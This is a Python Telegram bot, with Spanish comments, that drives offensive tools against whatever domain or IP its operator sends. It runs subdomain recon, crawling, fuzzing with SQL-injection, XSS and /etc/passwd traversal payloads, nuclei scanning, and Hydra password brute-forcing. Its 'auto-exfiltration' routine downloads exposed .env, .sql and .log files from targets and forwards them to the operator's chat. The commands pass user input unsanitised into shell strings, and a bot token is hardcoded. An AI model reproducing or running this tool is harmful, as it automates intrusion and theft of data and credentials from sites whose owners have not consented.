import telebot
from telebot import types
import subprocess
import os
import time
import re
import threading

# --- CONFIGURACIÓN ---
TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
YOUR_CHAT_ID = "6280594821"

bot = telebot.TeleBot(TOKEN)

# --- UTILIDAD: EJECUCIÓN EN SEGUNDO PLANO ---
def ejecutar_en_hilo(func, message):
    thread = threading.Thread(target=func, args=(message,))
    thread.start()

# --- DETECTOR DE RUTA PARA HYDRA ---
def obtener_comando_hydra():
    check = subprocess.run("command -v hydra", shell=True, capture_output=True)
    if check.returncode == 0:
        return "hydra"
    ruta_script = os.path.abspath(os.path.join(os.getcwd(), "..", "hydra", "hydra.sh"))
    if os.path.exists(ruta_script):
        subprocess.run(f"chmod +x {ruta_script}", shell=True)
        return f"bash {ruta_script}"
    return None

# --- MOTOR DE INTELIGENCIA ---
def motor_inteligencia(archivo_reporte):
    analisis = "🧠 **ANÁLISIS DE INTELIGENCIA V9.5**\n"
    prioridad = "🟢 BAJA"
    vulnerabilidades = []
    
    try:
        if not os.path.exists(archivo_reporte): return "⚠️ Reporte no encontrado."
        with open(archivo_reporte, "r", errors='ignore') as f:
            content = f.read().lower()

        if any(x in content for x in ["sql syntax", "mysql_fetch", "waitfor delay", "sql injection"]):
            vulnerabilidades.append("💉 **Inyección SQL detectada**")
            prioridad = "🔴 CRÍTICA"
        if any(x in content for x in ["<script>", "alert(", "xss-reflection"]):
            vulnerabilidades.append("🧪 **XSS (Cross Site Scripting)**")
            prioridad = "🟠 ALTA"
        if any(x in content for x in ["root:x:0:0", "boot.ini", "/etc/passwd"]):
            vulnerabilidades.append("📂 **LFI/RFI detectado**")
            prioridad = "🔴 CRÍTICA"
        
        if vulnerabilidades:
            analisis += f"Nivel: {prioridad}\n\n" + "\n".join(vulnerabilidades)
        else:
            analisis += "✅ No se detectaron patrones críticos."
    except Exception as e:
        analisis = f"⚠️ Error en motor IA: {str(e)}"
    
    return analisis

# --- AUTO-EXFILTRACIÓN ---
def exfiltrar_datos(url, chat_id):
    try:
        clean_url = url.strip()
        file_name = f"exfil_{int(time.time())}.txt"
        subprocess.run(f"curl -s -k -L -A 'Mozilla/5.0' {clean_url} -o {file_name}", shell=True)
        if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
            with open(file_name, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📥 **Exfiltración:**\n`{clean_url}`", parse_mode="Markdown")
            os.remove(file_name)
    except: pass

# --- MENÚ PRINCIPAL ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        help_text = (
            "🤖 **Bugtin Bot v9.5 - Ultimate Audit**\n\n"
            "📡 `/subs` - Recon de Subdominios (Muestra IP)\n"
            "🕸️ `/crawl` - Mapeo de Endpoints\n"
            "🔍 `/fuzz` - Fuzzing Avanzado\n"
            "🔓 `/auditar` - Escaneo con IA\n"
            "⚡ `/fuerza` - Hydra\n\n"
            "🚀 *Selecciona una opción:* "
        )
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📡 Reconocimiento", "🕸️ Crawling Activo")
        markup.add("🔍 Fuzzing Avanzado", "🔓 Auditoría IA")
        markup.add("⚡ Ataque Hydra")
        bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode="Markdown")

# --- COMANDO: SUBDOMINIOS ---
@bot.message_handler(commands=['subs'])
def start_subs(message):
    msg = bot.send_message(message.chat.id, "📡 **Introduce el dominio (ejemplo.com):**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_subdomains_step, m))

def process_subdomains_step(message):
    target = message.text.strip().lower()
    target = target.replace("https://", "").replace("http://", "").split("/")[0]
    chat_id = message.chat.id
    output_raw = f"raw_{target}.txt"
    output_final = f"subs_ips_{target}.txt"
    
    # Verificar si subfinder existe
    check_tool = subprocess.run("command -v subfinder", shell=True, capture_output=True)
    if check_tool.returncode != 0:
        bot.send_message(chat_id, "❌ **Error:** `subfinder` no está instalado en este sistema.")
        return

    bot.send_message(chat_id, f"🚀 Escaneando `{target}` y resolviendo IPs...", parse_mode="Markdown")
    
    try:
        # 1. Ejecución de subfinder
        subprocess.run(f"subfinder -d {target} -silent -o {output_raw}", shell=True, timeout=180)
        
        if os.path.exists(output_raw) and os.path.getsize(output_raw) > 0:
            # 2. Resolución de IP más robusta usando nslookup/host
            with open(output_raw, "r") as f_in, open(output_final, "w") as f_out:
                for line in f_in:
                    sub = line.strip()
                    if not sub: continue
                    # Intentar obtener IP
                    try:
                        res = subprocess.run(f"host {sub}", shell=True, capture_output=True, text=True, timeout=5)
                        if res.returncode == 0:
                            # Extraer IP de la salida de 'host'
                            ips = re.findall(r'has address (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', res.stdout)
                            ip_str = ips[0] if ips else "No IP"
                            f_out.write(f"{sub} [{ip_str}]\n")
                        else:
                            f_out.write(f"{sub} [No Resolvió]\n")
                    except:
                        f_out.write(f"{sub} [Error]\n")

            if os.path.exists(output_final) and os.path.getsize(output_final) > 0:
                with open(output_final, "rb") as f:
                    bot.send_document(chat_id, f, caption=f"🏁 Resultados para: `{target}`", parse_mode="Markdown")
                os.remove(output_final)
            else:
                bot.send_message(chat_id, "❌ Error al generar el archivo de IPs.")
            
            os.remove(output_raw)
        else:
            bot.send_message(chat_id, f"❌ No se hallaron subdominios para `{target}`.")
            
    except subprocess.TimeoutExpired:
        bot.send_message(chat_id, "⚠️ El proceso tardó demasiado (Timeout).")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error Crítico: {str(e)}")

# --- COMANDO: CRAWLING ---
@bot.message_handler(commands=['crawl'])
def start_crawl(message):
    msg = bot.send_message(message.chat.id, "🕸️ **Introduce la URL (https://site.com):**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_crawl_step, m))

def process_crawl_step(message):
    url = message.text.strip().lower()
    output = f"crawl_{int(time.time())}.txt"
    bot.send_message(message.chat.id, f"🕷️ Katana mapeando `{url}`...")
    try:
        subprocess.run(f"katana -u {url} -d 3 -jc -o {output} -silent", shell=True, timeout=300)
        if os.path.exists(output) and os.path.getsize(output) > 0:
            with open(output, "rb") as f:
                bot.send_document(message.chat.id, f, caption=f"🗺️ Mapa: {url}")
            os.remove(output)
        else:
            bot.send_message(message.chat.id, "❌ No se pudo extraer estructura.")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")

# --- COMANDO: FUZZING ---
@bot.message_handler(commands=['fuzz'])
def start_fuzz(message):
    msg = bot.send_message(message.chat.id, "🔍 **URL con FUZZ (ej: https://site.com/p.php?id=FUZZ):**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_fuzz_step, m))

def process_fuzz_step(message):
    url = message.text.strip()
    payloads = "adv_payloads.txt"
    output = "fuzz_res.md"
    if "FUZZ" not in url:
        bot.send_message(message.chat.id, "❌ Error: Falta palabra `FUZZ`.")
        return
    if not os.path.exists(payloads):
        with open(payloads, "w") as f: f.write("' OR 1=1--\n<script>alert(1)</script>\n../../etc/passwd")

    bot.send_message(message.chat.id, "🧪 Iniciando FFuf...")
    try:
        subprocess.run(f"ffuf -u {url} -w {payloads} -t 30 -o {output} -of md", shell=True)
        if os.path.exists(output):
            with open(output, "rb") as f:
                bot.send_document(message.chat.id, f, caption="🎯 Resultados Fuzzing")
            os.remove(output)
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")

# --- COMANDO: AUDITORÍA IA ---
@bot.message_handler(commands=['auditar'])
def start_audit(message):
    msg = bot.send_message(message.chat.id, "🔓 **Introduce URL para Auditoría IA:**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_audit_step, m))

def process_audit_step(message):
    target = message.text.strip().lower()
    report = f"audit_{int(time.time())}.txt"
    bot.send_message(message.chat.id, f"🛰️ Nuclei analizando `{target}`...")
    try:
        subprocess.run(f"nuclei -u {target} -silent -o {report}", shell=True)
        if os.path.exists(report) and os.path.getsize(report) > 0:
            bot.send_message(message.chat.id, motor_inteligencia(report), parse_mode="Markdown")
            
            with open(report, "r") as f:
                for line in f:
                    if "http" in line and any(x in line for x in [".env", ".sql", ".log"]):
                        match = re.search(r'https?://[^\s\[\]\(\)]+', line)
                        if match: exfiltrar_datos(match.group(0), message.chat.id)
            
            with open(report, "rb") as f:
                bot.send_document(message.chat.id, f, caption=f"📄 Reporte: {target}")
            os.remove(report)
        else:
            bot.send_message(message.chat.id, "✅ Sin vulnerabilidades críticas.")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")

# --- COMANDO: FUERZA BRUTA (HYDRA) ---
@bot.message_handler(commands=['fuerza'])
def start_fuerza(message):
    ejemplo = "⚡ **Ataque Hydra**\nFormato: `IP Servicio Usuario`"
    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_fuerza_step, m))

def process_fuerza_step(message):
    try:
        cmd = obtener_comando_hydra()
        data = message.text.split()
        if not cmd or len(data) < 3:
            bot.send_message(message.chat.id, "❌ Error en parámetros.")
            return
        ip, svc, user = data[0], data[1], data[2]
        subprocess.run(f"{cmd} -l {user} -P passwords.txt -t 4 -f {ip} {svc} -o res_hydra.txt", shell=True)
        if os.path.exists("res_hydra.txt"):
            with open("res_hydra.txt", "r") as f:
                bot.send_message(message.chat.id, f"🎯 **ACCESO:**\n`{f.read()}`", parse_mode="Markdown")
            os.remove("res_hydra.txt")
        else:
            bot.send_message(message.chat.id, "❌ No se encontró contraseña.")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")

# --- BOTONES ---
@bot.message_handler(func=lambda m: True)
def router(m):
    if m.text == "📡 Reconocimiento": start_subs(m)
    elif m.text == "🕸️ Crawling Activo": start_crawl(m)
    elif m.text == "🔍 Fuzzing Avanzado": start_fuzz(m)
    elif m.text == "🔓 Auditoría IA": start_audit(m)
    elif m.text == "⚡ Ataque Hydra": start_fuerza(m)

print("🚀 Bugtin Bot v9.5 ONLINE - Corrección /subs Aplicada")
bot.polling(none_stop=True)
